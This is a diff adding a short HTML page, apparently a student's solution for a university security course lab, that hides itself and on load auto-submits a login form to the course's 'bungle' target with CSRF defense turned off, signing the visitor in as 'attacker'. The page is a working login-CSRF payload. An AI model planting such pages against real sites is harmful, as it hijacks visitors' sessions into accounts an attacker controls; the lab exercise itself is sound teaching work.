@@ -1,0 +1,22 @@
+<html>
+<body onload="autoLogin()" hidden>
+<iframe name="Z" style="width:100%; height:60%" src="https://example.com"></iframe> 
+
+<form id="loginForm" target="Z" action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5" method="post">
+
+      <input name="username" value="attacker">
+
+      <input name="password" value="l33th4x">
+      
+      <input type="submit" value="login">
+
+</form>
+
+<script>
+function autoLogin(){
+    // console.log("autologin");
+    document.getElementById("loginForm").submit();
+}
+</script>
+</body>
+</html>
